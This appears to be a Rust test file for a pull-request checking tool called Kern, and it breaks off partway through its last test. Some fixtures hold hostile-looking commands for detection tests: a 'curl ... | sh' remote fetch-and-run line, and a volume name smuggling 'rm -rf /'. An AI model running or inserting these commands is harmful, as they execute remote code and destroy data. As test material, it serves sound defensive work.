use kern::proof::{Count, Report};
use kern::util::*;
use kern::{check, drive, policy, receipt, suite};
use serde_json::{Value, json};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::process::Command;

struct Temp(PathBuf);
impl Temp {
    fn new() -> Temp {
        let p = std::env::temp_dir().join(format!("kern-reliability-{}", uuid4().unwrap()));
        std::fs::create_dir_all(&p).unwrap();
        Temp(p)
    }
}
impl Drop for Temp {
    fn drop(&mut self) { let _ = std::fs::remove_dir_all(&self.0); }
}

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git").args(args).current_dir(dir).env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t").env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t").env("GIT_CONFIG_NOSYSTEM", "1").output().unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}
fn write(dir: &Path, path: &str, text: &str) {
    let p = dir.join(path);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, text).unwrap();
}
fn repo(t: &Temp, files: &[(&str, &str)]) -> (PathBuf, String) {
    let r = t.0.join("repo");
    std::fs::create_dir_all(&r).unwrap();
    git(&r, &["init", "-q", "-b", "main"]);
    git(&r, &["config", "core.autocrlf", "false"]);
    for (p, text) in files { write(&r, p, text); }
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-q", "--allow-empty", "-m", "base"]);
    let base = git(&r, &["rev-parse", "HEAD"]);
    (r, base)
}
fn commit(r: &Path, files: &[(&str, &str)]) -> String {
    for (p, text) in files { write(r, p, text); }
    git(r, &["add", "-A"]);
    git(r, &["commit", "-q", "-m", "change"]);
    git(r, &["rev-parse", "HEAD"])
}
fn operator() -> policy::Operator {
    policy::operator(&json!({ "version": 3, "repository": "acme/shop", "deployment": "single-vm", "executors": ["external"], "image": format!("sha256:{}", "a".repeat(64)),
        "builders": { "executor": null, "verifier": "e".repeat(64) }, "checks": [{ "id": "addition", "file": std::path::absolute("checks.json").unwrap(), "sha256": "b".repeat(64) }],
        "registry": "registry.npmjs.org", "permissions": {} })).unwrap()
}
fn report(tests: &[(&str, u32, u32, u32)], problems: &[&str]) -> Report {
    let mut t = BTreeMap::new();
    for (k, passed, failed, skipped) in tests { t.insert(k.to_string(), Count { passed: *passed, failed: *failed, skipped: *skipped }); }
    Report { tests: t, problems: problems.iter().map(|p| p.to_string()).collect(), why: BTreeMap::new() }
}
fn drive_json() -> Value { json!({ "base": "1111111111111111111111111111111111111111", "head": "2222222222222222222222222222222222222222", "skipped": [], "unmeasured": [] }) }
fn clean_rules() -> Value { json!({ "changed": [{ "path": "src/total.js", "operation": "modify" }], "powers": [], "tricks": [], "settings": [], "protected": [], "dependencies": [], "agent_notes": [], "not_checked": [] }) }
fn clean_tests() -> Value { json!({ "status": "RAN", "runner": "vitest", "before": { "passed": 12, "failed": 0, "skipped": 0 }, "after": { "passed": 12, "failed": 0, "skipped": 0 }, "kept": 12, "broke": [], "flaky": [], "gone": [], "newly_skipped": [], "added": [], "already_failing": [], "new_problems": [] }) }
fn off() -> Value { json!({ "status": "OFF", "why": "no AI key" }) }

const PACKAGE: &str = r#"{"name":"shop","devDependencies":{"vitest":"3.2.0"}}"#;
const MATH: &str = "export function sum(items) {\n  return items.reduce((a, b) => a + b, 0);\n}\nexport function product(items) {\n  return items.reduce((a, b) => a * b, 1);\n}\n";
const TOTAL: &str = "import { sum } from './math.js';\n\nexport function total(items) {\n  return sum(items);\n}\n";
const TOTAL_TEST: &str = "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\ntest('adds', () => expect(total([2, 3])).toBe(5));\n";

#[test]
fn a_suite_in_which_no_test_passed_before_is_not_reported_as_run() {
    let before = report(&[("t > needs the database", 0, 1, 0), ("t > needs the network", 0, 1, 0)], &[]);
    let after = report(&[("t > needs the database", 0, 1, 0), ("t > needs the network", 0, 1, 0)], &[]);
    let c = suite::compare(&before, &after, None);
    assert_eq!(c["status"], "NOT_RUN", "no test passed before or after, so the tests showed nothing: {c}");
}

#[test]
fn a_change_to_an_import_line_still_runs_the_tests() {
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", PACKAGE), ("src/math.js", MATH), ("src/total.js", TOTAL), ("test/total.test.js", TOTAL_TEST)]);
    let head = commit(&r, &[("src/total.js", &TOTAL.replace("import { sum }", "import { product as sum }"))]);
    let out = check::check(&r, &base, &head, &t.0.join("out"), &operator(), None, None).unwrap();
    assert_ne!(out["tests"], "NOTHING_TO_RUN", "total() now multiplies, and the test that passed before would fail: {out}");
}

#[test]
fn a_submodule_change_is_named_in_the_receipt() {
    let t = Temp::new();
    let (r, _) = repo(&t, &[("package.json", PACKAGE), ("src/math.js", MATH)]);
    git(&r, &["update-index", "--add", "--cacheinfo", "160000,1111111111111111111111111111111111111111,vendor/payments"]);
    git(&r, &["commit", "-q", "-m", "add submodule"]);
    let base = git(&r, &["rev-parse", "HEAD"]);
    git(&r, &["update-index", "--cacheinfo", "160000,2222222222222222222222222222222222222222,vendor/payments"]);
    git(&r, &["commit", "-q", "-m", "move submodule"]);
    let head = git(&r, &["rev-parse", "HEAD"]);
    check::check(&r, &base, &head, &t.0.join("out"), &operator(), None, None).unwrap();
    let md = std::fs::read_to_string(t.0.join("out").join("receipt.md")).unwrap();
    assert!(md.contains("vendor/payments"), "the change points the project at other code, yet the receipt never names it:\n{md}");
}

#[test]
fn a_package_whose_tests_kern_runs_gets_its_dependencies_installed() {
    let t = Temp::new();
    let kit = r#"{"name":"kit","devDependencies":{"vitest":"3.2.0","left-pad":"1.3.0"}}"#;
    let (r, base) = repo(&t, &[("package.json", r#"{"name":"mono","private":true}"#), ("packages/kit/package.json", kit), ("packages/kit/src/pad.js", "export const pad = (s) => s;\n"),
        ("packages/kit/test/pad.test.js", "import { test, expect } from 'vitest';\nimport { pad } from '../src/pad.js';\ntest('pads', () => expect(pad('a')).toBe('a'));\n")]);
    let head = commit(&r, &[("packages/kit/test/pad.test.js", "import { test, expect } from 'vitest';\nimport { pad } from '../src/pad.js';\ntest('pads', () => expect(pad('b')).toBe('b'));\n")]);
    let has = |d: &str| d == "packages/kit";
    assert_eq!(suite::packages(&["packages/kit/test/pad.test.js"], has), ["packages/kit"], "Kern runs the tests of packages/kit");
    let out = t.0.join("out");
    drive::prepare(&r, &base, &head, &out, None).unwrap();
    assert!(drive::setup(&out, &operator(), u64::MAX).is_err(), "no Docker here, so setup stops after it writes its plan");
    let plan = read_json(out.join("sandbox").join("setup-new").join("drive-setup.json")).or_else(|_| read_json(out.join("sandbox").join("setup-old").join("drive-setup.json"))).unwrap();
    let dirs: Vec<String> = plan["dirs"].as_array().unwrap().iter().map(|d| d.as_str().unwrap().to_string()).collect();
    assert!(dirs.contains(&"packages/kit".to_string()), "Kern runs the tests of packages/kit but installs only {dirs:?}, so vitest and left-pad are missing there");
}

#[test]
fn only_the_setup_of_a_project_whose_tests_drive_a_browser_looks_for_the_playwright_it_installed() {
    let plan_of = |files: &[(&str, &str)]| -> Value {
        let t = Temp::new();
        let (r, base) = repo(&t, files);
        let head = commit(&r, &[("src/page.js", "export const title = (name) => name;\n")]);
        let out = t.0.join("out");
        drive::prepare(&r, &base, &head, &out, None).unwrap();
        assert!(drive::setup(&out, &operator(), u64::MAX).is_err(), "no Docker here, so setup stops after it writes its plan");
        read_json(out.join("sandbox").join("setup-new").join("drive-setup.json")).or_else(|_| read_json(out.join("sandbox").join("setup-old").join("drive-setup.json"))).unwrap()
    };
    let browser = r#"{"name":"shop","type":"module","scripts":{"test":"vitest run"},"devDependencies":{"vitest":"3.2.4","playwright-core":"1.49.1"}}"#;
    assert_eq!(plan_of(&[("package.json", browser), ("src/page.js", "export const title = (shop) => shop;\n")])["browsers"], true,
        "the test launches Chromium through playwright-core, so the setup reports which playwright versions it installed");
    assert_eq!(plan_of(&[("package.json", PACKAGE), ("src/page.js", "export const title = (shop) => shop;\n")])["browsers"], false, "no browser dependency, nothing to look for");
}

#[test]
fn a_receipt_whose_package_tests_did_not_run_does_not_say_nothing_unexpected() {
    let mut t = clean_tests();
    t["runner"] = json!("vitest in packages/kit");
    t["not_run"] = json!([{ "dir": "apps/web", "why": "Kern runs the tests of at most 5 packages per change" }]);
    let r = receipt::build(&drive_json(), &clean_rules(), &t, &off());
    let md = receipt::markdown(&r, None);
    assert!(!md.contains("### ✅ Kern: Nothing unexpected\n"), "the tests of apps/web never ran, yet the receipt opens with an unqualified pass:\n{md}");
}

#[test]
fn a_change_that_adds_large_text_fixtures_is_still_checked() {
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", PACKAGE), ("src/math.js", MATH)]);
    let line = format!("{}\n", "x".repeat(1023));
    let fixture = line.repeat(1000);
    let files: Vec<(String, String)> = (0..70).map(|i| (format!("test/fixtures/case{i:02}.txt"), format!("{i}\n{fixture}"))).collect();
    let refs: Vec<(&str, &str)> = files.iter().map(|(p, s)| (p.as_str(), s.as_str())).collect();
    let head = commit(&r, &refs);
    let out = drive::prepare(&r, &base, &head, &t.0.join("out"), None);
    assert!(out.is_ok(), "70 text fixtures of 1 MB each are an ordinary change: {:?}", out.err().map(|e| e.0));
}

type Seen = std::sync::Arc<std::sync::Mutex<Vec<(String, String, String)>>>;
fn stub_github(route: impl Fn(&str, &str) -> (u16, String) + Send + Sync + 'static) -> (String, Seen) {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    let seen: Seen = Default::default();
    let log = seen.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut s) = stream else { continue };
            let mut reader = std::io::BufReader::new(s.try_clone().unwrap());
            let mut request = String::new();
            if std::io::BufRead::read_line(&mut reader, &mut request).is_err() { continue; }
            let mut length = 0usize;
            loop {
                let mut line = String::new();
                if std::io::BufRead::read_line(&mut reader, &mut line).unwrap_or(0) == 0 || line == "\r\n" { break; }
                if let Some(v) = line.to_ascii_lowercase().strip_prefix("content-length:") { length = v.trim().parse().unwrap_or(0); }
            }
            let mut body = vec![0u8; length];
            let _ = std::io::Read::read_exact(&mut reader, &mut body);
            let parts: Vec<&str> = request.split_whitespace().collect();
            let (method, path) = (parts.first().copied().unwrap_or("").to_string(), parts.get(1).copied().unwrap_or("").to_string());
            log.lock().unwrap().push((method.clone(), path.clone(), String::from_utf8_lossy(&body).to_string()));
            let (status, reply) = route(&method, &path);
            let _ = std::io::Write::write_all(&mut s, format!("HTTP/1.1 {status} X\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{reply}", reply.len()).as_bytes());
        }
    });
    (url, seen)
}
fn posted_status(tests: Value) -> String {
    let t = Temp::new();
    receipt::write(&t.0, &receipt::build(&drive_json(), &clean_rules(), &tests, &off()), None).unwrap();
    let (url, seen) = stub_github(|m, p| match (m, p) {
        ("GET", p) if p.starts_with("/repos/acme/shop/pulls/7") => (200, r#"{"head":{"sha":"2222222222222222222222222222222222222222"}}"#.into()),
        ("GET", p) if p.starts_with("/repos/acme/shop/issues/7/comments") => (200, "[]".into()),
        ("POST", _) => (201, r#"{"id":5,"html_url":"https://github.com/acme/shop/pull/7#c5"}"#.into()),
        _ => (404, "{}".into()),
    });
    receipt::post(&kern::github::Api::new(&url, "t").unwrap(), &t.0, "acme/shop", 7).unwrap();
    let log = seen.lock().unwrap().clone();
    let body = &log.iter().find(|(m, p, _)| m == "POST" && p.contains("/statuses/")).unwrap().2;
    serde_json::from_str::<Value>(body).unwrap()["description"].as_str().unwrap().to_string()
}

#[test]
fn a_status_for_a_receipt_whose_tests_did_not_run_differs_from_one_whose_tests_passed() {
    let ran = posted_status(clean_tests());
    let not_run = posted_status(json!({ "status": "NOT_RUN", "why": "Kern could not run the tests: Sandbox unavailable" }));
    assert_ne!(not_run, ran, "the Kern status is all a merge rule and the checks list show, and it reads the same whether the tests passed or never ran");
}

#[test]
fn a_receipt_after_a_thousand_comments_is_still_found() {
    let (url, _) = stub_github(|m, p| {
        if m != "GET" || !p.starts_with("/repos/acme/shop/issues/7/comments") { return (404, "{}".into()); }
        let page: u64 = p.split("page=").last().and_then(|n| n.parse().ok()).unwrap_or(1);
        if page <= 10 {
            let others: Vec<Value> = (0..100).map(|i| json!({ "id": page * 1000 + i, "user": { "login": "renovate[bot]" }, "body": "Bump a dependency" })).collect();
            return (200, json!(others).to_string());
        }
        if page == 11 { return (200, json!([{ "id": 99, "user": { "login": "github-actions[bot]" }, "body": "<!-- kern-receipt -->\n### ⚠️ Kern: 1 thing needs a look\n", "html_url": "https://github.com/acme/shop/pull/7#c99" }]).to_string()); }
        (200, "[]".into())
    });
    let v = receipt::verify(&kern::github::Api::new(&url, "t").unwrap(), "acme/shop", 7, &json!({ "keys": [] }), None).unwrap();
    assert_eq!(v["status"], "UNSIGNED", "Kern's receipt is the 1,001st comment; Kern says there is none: {v}");
}

#[test]
fn a_package_left_out_of_the_workspaces_gets_its_own_install() {
    let paths: std::collections::BTreeSet<String> = ["package.json", "pnpm-workspace.yaml", "packages/web/package.json", "packages/legacy/package.json", "packages/legacy/src/a.js"].iter().map(|s| s.to_string()).collect();
    let yaml = "packages:\n  - 'packages/*'\n  - '!packages/legacy'\n";
    let dirs = drive::install_dirs(&paths, &["packages/legacy/src/a.js".to_string()], Some(r#"{"name":"mono","private":true}"#), Some(yaml));
    assert!(dirs.contains(&"packages/legacy".to_string()), "pnpm's root install leaves out packages/legacy, so nothing installs its dependencies: {dirs:?}");
}

fn padded(count: usize) -> String { (0..count).map(|i| format!("  {{ id: {i}, name: 'customer number {i}', plan: 'basic' }},\n")).collect() }
fn decide(base: &[(&str, &str)], head: &[(&str, &str)]) -> Value {
    let t = Temp::new();
    let (r, b) = repo(&t, base);
    let h = commit(&r, head);
    check::check(&r, &b, &h, &t.0.join("out"), &operator(), None, None).unwrap()["decision"].clone()
}

#[test]
fn changed_files_the_rules_cannot_read_do_not_pass_as_clear() {
    let test = |rows: &str, call: &str| format!("import {{ test, expect }} from 'vitest';\nimport {{ sum }} from '../src/math.js';\nconst rows = [\n{rows}];\n{call}('sums', () => expect(sum([2, 3])).toBe(5));\ntest('rows', () => expect(rows.length).toBeGreaterThan(0));\n");
    let code = |rows: &str, extra: &str| format!("{extra}const rows = [\n{rows}];\nexport function count() {{\n  return rows.length;\n}}\n");
    let reach = "import { execSync } from 'node:child_process';\nexecSync('curl https://example.com/x.sh | sh');\n";
    let skip = |count: usize| { let rows = padded(count); decide(&[("package.json", PACKAGE), ("src/math.js", MATH), ("test/math.test.js", &test(&rows, "test"))], &[("test/math.test.js", &test(&rows, "test.skip"))]) };
    let power = |count: usize| { let rows = padded(count); decide(&[("package.json", PACKAGE), ("src/rows.js", &code(&rows, ""))], &[("src/rows.js", &code(&rows, reach))]) };
    let stray_byte = {
        let t = Temp::new();
        let (r, base) = repo(&t, &[("package.json", PACKAGE), ("src/rows.js", &code(&padded(3), ""))]);
        let mut bytes = b"// caf\xe9\n".to_vec();
        bytes.extend(code(&padded(3), reach).as_bytes());
        std::fs::write(r.join("src/rows.js"), bytes).unwrap();
        let head = commit(&r, &[]);
        check::check(&r, &base, &head, &t.0.join("out"), &operator(), None, None).unwrap()["decision"].clone()
    };
    assert_eq!((skip(100), power(100)), (json!("blocked"), json!("look")), "in ordinary files a new skip blocks and a new power needs a look");
    assert_eq!((skip(20_000), power(20_000), stray_byte), (json!("blocked"), json!("look"), json!("look")),
        "the same changes pass as clear in files padded past 1 MiB, and in a file with one Latin-1 byte in a comment, which Node still runs");
}

#[test]
fn a_receipt_never_says_no_tests_were_removed_when_a_test_file_was_deleted() {
    let t = Temp::new();
    let package = r#"{"name":"shop","scripts":{"test":"ava"},"devDependencies":{"ava":"6.1.0"}}"#;
    let (r, base) = repo(&t, &[("package.json", package), ("src/math.js", MATH), ("test/math.test.js", "import test from 'ava';\nimport { sum } from '../src/math.js';\ntest('sums', (t) => t.is(sum([2, 3]), 5));\n")]);
    std::fs::remove_file(r.join("test/math.test.js")).unwrap();
    let head = commit(&r, &[]);
    let out = check::check(&r, &base, &head, &t.0.join("out"), &operator(), None, None).unwrap();
    let md = std::fs::read_to_string(t.0.join("out").join("receipt.md")).unwrap();
    assert!(!md.contains("No skipped, focused or removed tests"), "the change deletes test/math.test.js and the tests did not run ({}), yet the receipt says:\n{md}", out["tests"]);
}

#[test]
fn github_hiccups_are_retried_and_a_receipt_comment_is_never_doubled() {
    use std::sync::atomic::{AtomicUsize, Ordering::SeqCst};
    let t = Temp::new();
    receipt::write(&t.0, &receipt::build(&drive_json(), &clean_rules(), &clean_tests(), &off()), None).unwrap();
    let (pulls, created, statuses) = (std::sync::Arc::new(AtomicUsize::new(0)), std::sync::Arc::new(AtomicUsize::new(0)), std::sync::Arc::new(AtomicUsize::new(0)));
    let (p, c, s) = (pulls.clone(), created.clone(), statuses.clone());
    let (url, seen) = stub_github(move |m, path| match (m, path) {
        ("GET", x) if x.starts_with("/repos/acme/shop/pulls/7") => {
            if p.fetch_add(1, SeqCst) < 2 { (502, "{}".into()) } else { (200, r#"{"head":{"sha":"2222222222222222222222222222222222222222"}}"#.into()) }
        }
        ("GET", x) if x.starts_with("/repos/acme/shop/issues/7/comments") => {
            if c.load(SeqCst) == 0 { return (200, "[]".into()); }
            (200, json!([{ "id": 5, "user": { "login": "github-actions[bot]" }, "body": "<!-- kern-receipt -->\nhalf", "html_url": "https://github.com/acme/shop/pull/7#c5" }]).to_string())
        }
        ("POST", "/repos/acme/shop/issues/7/comments") => { c.fetch_add(1, SeqCst); (502, "{}".into()) }
        ("PATCH", "/repos/acme/shop/issues/comments/5") => (200, "{}".into()),
        ("POST", x) if x.starts_with("/repos/acme/shop/statuses/") => if s.fetch_add(1, SeqCst) == 0 { (429, "{}".into()) } else { (201, "{}".into()) },
        _ => (404, "{}".into()),
    });
    let out = receipt::post(&kern::github::Api::new(&url, "t").unwrap(), &t.0, "acme/shop", 7);
    let log = seen.lock().unwrap().clone();
    let out = out.unwrap_or_else(|e| panic!("two 502s and a rate limit are ordinary GitHub hiccups: {} after {log:?}", e.0));
    assert_eq!(created.load(SeqCst), 1, "GitHub made the comment and then answered 502; asking again would post the receipt twice: {log:?}");
    assert!(log.iter().any(|(m, p, b)| m == "PATCH" && p.ends_with("/comments/5") && b.contains("kern-receipt")), "the comment GitHub made is filled in instead: {log:?}");
    assert_eq!(statuses.load(SeqCst), 2, "a rate-limited status is sent again: {log:?}");
    assert_eq!(out["state"], "success", "{out}");
}

#[test]
fn a_check_has_one_time_limit_and_each_run_gets_only_the_time_left() {
    let now = now_ms();
    assert_eq!(within(u64::MAX, 900), 900, "with no limit a run keeps its own");
    let left = within(now + 120_000, 900);
    assert!((118..=120).contains(&left), "two minutes left gives a run two minutes, not fifteen: {left}");
    assert_eq!(within(now.saturating_sub(1), 900), 0, "a limit already passed leaves nothing");
    assert_eq!(check::minutes(), 55, "the check ends well before the workflow's 75-minute job limit");
}

#[test]
fn a_check_killed_while_it_set_up_leaves_a_record_that_clean_reads() {
    let t = Temp::new();
    std::fs::write(t.0.join("volumes.txt"), "not-a-kern-volume\nkern-deps-x;rm -rf /\n").unwrap();
    let r = drive::clean(&t.0).unwrap();
    assert_eq!(r["removed"], json!([]), "only Kern's own volume names reach docker: {r}");
    assert!(!t.0.join("volumes.txt").exists(), "the record is gone once the volumes are");
}

#[test]
fn a_change_to_how_the_tests_run_needs_a_look_and_a_dependency_bump_does_not() {
    let settings = |base: &str, head: &str| -> Vec<Value> {
        let t = Temp::new();
        let (r, b) = repo(&t, &[("package.json", base), ("src/math.js", MATH)]);
        let h = commit(&r, &[("package.json", head)]);
        kern::rules::rules(&r, &b, &h).unwrap()["settings"].as_array().cloned().unwrap_or_default()
    };
    let script = |test: &str, vitest: &str| format!(r#"{{"name":"shop","scripts":{{"test":"{test}"}},"devDependencies":{{"vitest":"{vitest}"}}}}"#);
    assert!(settings(&script("vitest run", "3.2.0"), &script("vitest run", "3.2.4")).is_empty(), "a version bump leaves how the tests run alone");
    assert!(settings(&script("vitest run", "3.2.0"), &script("vitest", "3.2.0")).is_empty(), "vitest and vitest run run the same tests");
    let changed = settings(&script("vitest run", "3.2.0"), &script("vitest run --config fake.config.js", "3.2.0"));
    assert_eq!(changed.len(), 1, "a pull request that points the tests at another config changes which tests run: {changed:?}");
    assert_eq!(changed[0]["path"], "package.json");
    let jest = |block: &str| format!(r#"{{"name":"shop","scripts":{{"test":"jest"}},"devDependencies":{{"jest":"30.0.0"}},"jest":{block}}}"#);
    assert_eq!(settings(&jest(r#"{"testEnvironment":"node"}"#), &jest(r#"{"testEnvironment":"node","setupFiles":["./quiet.js"]}"#)).len(), 1,
        "jest settings kept in package.json decide which tests run as much as jest.config.js does");
}

#[test]
fn a_text_file_the_code_reads_is_not_documentation() {
    let allow = "import { readFileSync } from 'node:fs';\nexport const allowed = () => readFileSync(new URL('./allowlist.txt', import.meta.url), 'utf8').split('\\n');\n";
    let tests_after = |files: &[(&str, &str)], change: &[(&str, &str)]| -> Value {
        let t = Temp::new();
        let (r, b) = repo(&t, files);
        let h = commit(&r, change);
        check::check(&r, &b, &h, &t.0.join("out"), &operator(), None, None).unwrap()["tests"].clone()
    };
    let files = [("package.json", PACKAGE), ("src/allow.js", allow), ("src/allowlist.txt", "example.com\n"), ("README.md", "# shop\n")];
    assert_ne!(tests_after(&files, &[("src/allowlist.txt", "example.com\nevil.example\n")]), json!("NOTHING_TO_RUN"),
        "the code reads allowlist.txt, so a change to it changes what the code does and the tests must run");
    assert_eq!(tests_after(&files, &[("README.md", "# shop\n\nAdds up baskets.\n")]), json!("NOTHING_TO_RUN"), "no code reads the README");
}

#[test]
fn a_blocked_test_file_says_why_it_no_longer_runs() {
    let report = |message: &str| -> Vec<u8> {
        let status = if message.is_empty() { "passed" } else { "failed" };
        let assertions = if message.is_empty() { json!([{ "ancestorTitles": [], "title": "carts", "status": "passed" }]) } else { json!([]) };
        json!({ "numTotalTests": 1, "testResults": [
            { "name": "/workspace/test/total.test.js", "status": "passed", "message": "", "assertionResults": [{ "ancestorTitles": [], "title": "adds", "status": "passed" }] },
            { "name": "/workspace/test/cart.test.js", "status": status, "message": message, "assertionResults": assertions }
        ] }).to_string().into_bytes()
    };
    let before = kern::proof::read_report(policy::Runner::Vitest, &report("")).unwrap();
    let after = kern::proof::read_report(policy::Runner::Vitest, &report("\u{1b}[31mError: Cannot find module '../src/cart.js'\u{1b}[39m\n  imported from test/cart.test.js\n    at resolve (node:internal)")).unwrap();
    let tests = suite::compare(&before, &after, Some(&after));
    let md = receipt::markdown(&receipt::build(&drive_json(), &clean_rules(), &tests, &off()), None);
    assert!(md.contains("test/cart.test.js") && md.contains("Cannot find module") && !md.contains("\u{1b}"), "a block names the error, without terminal colours:\n{md}");
}

#[test]
fn a_test_counts_as_gone_only_when_it_passed_before_and_stays_gone() {
    let before = report(&[("a > passes", 1, 0, 0), ("a > needs a database", 0, 1, 0), ("b > flaky file", 1, 0, 0)], &[]);
    let after = report(&[], &[]);
    let again = report(&[("b > flaky file", 1, 0, 0)], &[]);
    let c = suite::compare(&before, &after, Some(&again));
    assert_eq!(c["gone"], json!(["a > passes"]), "a test that already failed before is set aside, and one that came back on the rerun did not go: {c}");
    let c = suite::compare(&before, &after, None);
    assert_eq!(c["gone"], json!(["a > passes", "b > flaky file"]), "{c}");
}

#[test]
fn the_sandbox_says_why_it_could_not_run_the_tests() {
    let errors = b"npm warn something\n{\"reason\":\"The test runner is not installed in the project: /workspace/node_modules/.bin/jest does not exist\",\"status\":\"DENIED\"}\n";
    assert_eq!(kern::sandbox::refusal(errors).as_deref(), Some("The test runner is not installed in the project: /workspace/node_modules/.bin/jest does not exist"));
    assert_eq!(kern::sandbox::refusal(b"no json here\n"), None);
}

#[test]
fn a_package_json_change_says_what_changed_in_it() {
    let look = |base: &str, head: &str| -> Vec<String> {
        let t = Temp::new();
        let (r, b) = repo(&t, &[("package.json", base), ("src/math.js", MATH)]);
        let h = commit(&r, &[("package.json", head)]);
        let rules = kern::rules::rules(&r, &b, &h).unwrap();
        receipt::build(&drive_json(), &rules, &clean_tests(), &off())["look"].as_array().unwrap().iter().filter(|x| x["kind"] == "dependencies").map(|x| x["what"].as_str().unwrap().to_string()).collect()
    };
    let base = r#"{"name":"shop","main":"src/math.js","scripts":{"test":"vitest run","build":"tsc"},"devDependencies":{"vitest":"3.2.0"}}"#;
    let hook = r#"{"name":"shop","main":"src/math.js","scripts":{"test":"vitest run","build":"tsc","postinstall":"node setup.js"},"devDependencies":{"vitest":"3.2.0"}}"#;
    let items = look(base, hook);
    assert!(items.len() == 1 && items[0].contains("scripts.postinstall") && !items[0].contains("dependencies change"), "a new install hook is named as what it is: {items:?}");
    let bump = r#"{"name":"shop","main":"src/index.js","scripts":{"test":"vitest run","build":"tsc"},"devDependencies":{"vitest":"3.2.4"}}"#;
    let items = look(base, bump);
    assert!(items.len() == 1 && items[0].contains("vitest 3.2.0") && !items[0].contains("main"), "main neither runs on install nor decides what gets installed: {items:?}");
}

#[test]
fn a_failure_the_old_code_also_shows_when_its_file_runs_alone_never_blocks() {
    let before = report(&[("packages/cli/build.test.ts > builds", 1, 0, 0), ("packages/core/merge.test.ts > merges", 1, 0, 0)], &[]);
    let after = report(&[("packages/core/merge.test.ts > merges", 0, 1, 0)], &["packages/cli/build.test.ts"]);
    let alone_new = report(&[("packages/core/merge.test.ts > merges", 0, 1, 0)], &["packages/cli/build.test.ts"]);
    let alone_old = report(&[("packages/core/merge.test.ts > merges", 1, 0, 0)], &["packages/cli/build.test.ts"]);
    let c = suite::judged(&before, &after, Some(&alone_new), Some(&alone_old));
    assert_eq!(c["new_problems"], json!([]), "the file fails alone on the old code too (it needs a sibling package built), so the full run passing it was luck: {c}");
    assert_eq!(c["broke"], json!(["packages/core/merge.test.ts > merges"]), "this test fails alone on the new code and passes alone on the old code: {c}");
    assert!(c["environmental"].as_array().unwrap().iter().any(|f| f == "packages/cli/build.test.ts"), "the file fails on the old code alone too, so it is set aside: {c}");
    let shaky_old = report(&[("packages/core/merge.test.ts > merges", 0, 1, 0)], &[]);
    let c = suite::judged(&before, &after, Some(&alone_new), Some(&shaky_old));
    assert_eq!(c["broke"], json!([]), "a test that fails alone on the old code is not broken by the change: {c}");
}

#[test]
fn suspect_test_files_are_run_again_alone_with_the_project_s_own_options() {
    let files: std::collections::BTreeSet<String> = ["packages/cli/src/a.test.ts".to_string(), "packages/cli/src/[id].test.ts".to_string()].into();
    let tests = |runner: policy::Runner, command: &[&str]| policy::Tests { paths: Vec::new(), kind: policy::Kind::Feature, runner, command: command.iter().map(|s| s.to_string()).collect(), edits: policy::Edits::Checked };
    let jest = suite::focused(&tests(policy::Runner::Jest, &["/workspace/node_modules/.bin/jest", "--config", "jest.unit.js"]), &files, "packages/cli").unwrap();
    assert_eq!(jest.command, ["/workspace/node_modules/.bin/jest", "--config", "jest.unit.js", "--runTestsByPath", "/workspace/packages/cli/src/[id].test.ts", "/workspace/packages/cli/src/a.test.ts"]);
    let vitest = suite::focused(&tests(policy::Runner::Vitest, &["/workspace/node_modules/.bin/vitest", "run", "--maxWorkers=2"]), &files, "packages/cli").unwrap();
    assert_eq!(vitest.command, ["/workspace/node_modules/.bin/vitest", "run", "--maxWorkers=2", "src/[id].test.ts", "src/a.test.ts"]);
    assert!(suite::focused(&tests(policy::Runner::Vitest, &["/workspace/node_modules/.bin/vitest", "run", "tests/unit"]), &files, "packages/cli").is_none(), "a script that already filters files cannot be narrowed by adding more filters");
    assert!(suite::focused(&tests(policy::Runner::Mocha, &["/workspace/node_modules/.bin/mocha"]), &files, "").is_none());
}

#[test]
fn a_failure_that_shows_only_when_files_run_together_needs_a_look() {
    let before = report(&[("a.test.ts > shares state", 1, 0, 0), ("b.test.ts > flakes", 1, 0, 0)], &[]);
    let after = report(&[("a.test.ts > shares state", 0, 1, 0), ("b.test.ts > flakes", 0, 1, 0)], &[]);
    let alone_new = report(&[("a.test.ts > shares state", 1, 0, 0), ("b.test.ts > flakes", 1, 0, 0)], &[]);
    let whole_again = report(&[("a.test.ts > shares state", 0, 1, 0), ("b.test.ts > flakes", 1, 0, 0)], &[]);
    let alone_old = report(&[("a.test.ts > shares state", 1, 0, 0), ("b.test.ts > flakes", 1, 0, 0)], &[]);
    let c = suite::confirmed(&before, &after, Some(&alone_new), Some(&whole_again), Some(&alone_old));
    assert_eq!(c["together"], json!(["a.test.ts > shares state"]), "it passes alone but fails again in the whole suite: a look, never a silent pass, and no block it cannot reproduce: {c}");
    assert_eq!(c["flaky"], json!(["b.test.ts > flakes"]), "{c}");
}

#[test]
fn tests_that_cannot_load_on_either_side_are_named_as_such_with_the_first_error() {
    let mut before = report(&[], &["components/table.test.tsx", "components/form.test.tsx"]);
    before.why.insert("components/form.test.tsx".into(), "Cannot find module './version' from 'components/version/index.tsx'".into());
    let c = suite::compare(&before, &before.clone(), None);
    assert_eq!(c["status"], "NOT_RUN");
    let why = c["why"].as_str().unwrap();
    assert!(why.contains("2 test files") && why.contains("components/form.test.tsx") && why.contains("Cannot find module"), "the tests did not go missing: none of them could load, and the receipt says why: {why}");
}

#[test]
fn a_test_counts_as_newly_skipped_only_when_the_rerun_skips_it_too_and_the_old_code_alone_does_not() {
    let before = report(&[("t/a.test.ts > hook guarded", 1, 0, 0), ("t/b.test.ts > really skipped", 1, 0, 0), ("t/c.test.ts > skips alone on old", 1, 0, 0)], &[]);
